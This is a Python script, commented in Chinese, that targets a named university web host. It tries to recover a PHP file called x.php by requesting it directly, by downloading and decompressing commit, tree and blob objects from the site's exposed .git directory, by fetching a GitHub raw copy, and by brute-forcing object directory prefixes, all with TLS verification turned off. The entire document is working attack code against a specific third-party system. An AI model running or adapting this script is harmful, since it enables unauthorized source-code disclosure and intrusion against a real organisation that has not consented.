#!/usr/bin/env python3
import requests
import re
import zlib
import os
urllib3 = __import__('urllib3')
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "https://olympic.su.ac.th"

print("[*] 通过.git下载x.php文件...")

# 方法1: 直接从web路径访问
target_paths = [
    "/banpot/scmeeting/x.php",
    "/var/www/html/banpot/scmeeting/x.php",
]

for path in target_paths:
    web_path = path.replace("/var/www/html", "")
    resp = requests.get(url + web_path, verify=False, timeout=5)
    if resp.status_code == 200 and len(resp.text) > 10:
        print(f"[+] 直接访问成功: {web_path}")
        print("=" * 70)
        print(resp.text)
        print("=" * 70)
        exit(0)

# 方法2: 通过git objects下载
print("[*] 从git objects下载...")

# 先获取所有对象列表（如果可能）
# 或者通过已知的commit hash下载tree对象

commit_hash = "28a9d8b08195ac9eae7fa12afca9c5141d0ab151"
obj_path = f"/.git/objects/{commit_hash[:2]}/{commit_hash[2:]}"
resp = requests.get(url + obj_path, verify=False, timeout=10)

if resp.status_code == 200:
    # 解压git对象
    try:
        decompressed = zlib.decompress(resp.content)
        print(f"[+] Commit对象下载成功: {len(decompressed)} bytes")
        
        # 解析commit对象，找到tree hash
        tree_match = re.search(rb'tree\s+([a-f0-9]{40})', decompressed)
        if tree_match:
            tree_hash = tree_match.group(1).decode()
            print(f"[+] Tree hash: {tree_hash}")
            
            # 下载tree对象
            tree_obj_path = f"/.git/objects/{tree_hash[:2]}/{tree_hash[2:]}"
            resp2 = requests.get(url + tree_obj_path, verify=False, timeout=10)
            
            if resp2.status_code == 200:
                tree_data = zlib.decompress(resp2.content)
                print(f"[+] Tree对象下载成功")
                
                # 查找x.php的blob hash
                if b'x.php' in tree_data or b'scmeeting' in tree_data:
                    # 尝试解析tree对象找到文件hash
                    # tree对象格式: mode filename\0hash
                    # 简单搜索包含x.php的部分
                    xphp_match = re.search(rb'x\.php\0([a-f0-9]{40})', tree_data)
                    if xphp_match:
                        blob_hash = xphp_match.group(1).decode()
                        print(f"[+] 找到x.php blob hash: {blob_hash}")
                        
                        # 下载blob对象
                        blob_obj_path = f"/.git/objects/{blob_hash[:2]}/{blob_hash[2:]}"
                        resp3 = requests.get(url + blob_obj_path, verify=False, timeout=10)
                        
                        if resp3.status_code == 200:
                            blob_data = zlib.decompress(resp3.content)
                            # 移除git对象头（blob size\0）
                            content = blob_data.split(b'\0', 1)
                            if len(content) > 1:
                                file_content = content[1].decode('utf-8', errors='ignore')
                                print("[+] x.php文件内容:")
                                print("=" * 70)
                                print(file_content)
                                print("=" * 70)
                                exit(0)
    except Exception as e:
        print(f"[-] 解压失败: {e}")

# 方法3: 通过GitHub直接获取
print("\n[*] 尝试从GitHub获取...")
github_url = "https://raw.githubusercontent.com/banpot/su_emeeting/master/banpot/scmeeting/x.php"
resp = requests.get(github_url, timeout=10)
if resp.status_code == 200:
    print("[+] 从GitHub获取成功:")
    print("=" * 70)
    print(resp.text)
    print("=" * 70)
    exit(0)

# 方法4: 遍历git objects目录
print("\n[*] 尝试遍历objects目录...")
objects_base = "/.git/objects/"
# 枚举可能的hash前缀
import string
for c1 in '0123456789abcdef':
    for c2 in '0123456789abcdef':
        prefix = c1 + c2
        dir_url = url + objects_base + prefix + "/"
        resp = requests.get(dir_url, verify=False, timeout=3)
        if resp.status_code == 200:
            # 查找文件列表
            files = re.findall(r'href="([^"]+)"', resp.text)
            for f in files[:5]:
                if f.endswith('.php') or 'x' in f.lower():
                    obj_url = url + objects_base + prefix + "/" + f
                    resp2 = requests.get(obj_url, verify=False, timeout=5)
                    if resp2.status_code == 200:
                        try:
                            decompressed = zlib.decompress(resp2.content)
                            if b'<?php' in decompressed:
                                print(f"[+] 找到PHP文件: {prefix}/{f}")
                                content = decompressed.split(b'\0', 1)
                                if len(content) > 1:
                                    print(content[1].decode('utf-8', errors='ignore')[:500])
                        except:
                            pass

print("[-] 所有方法尝试完毕")
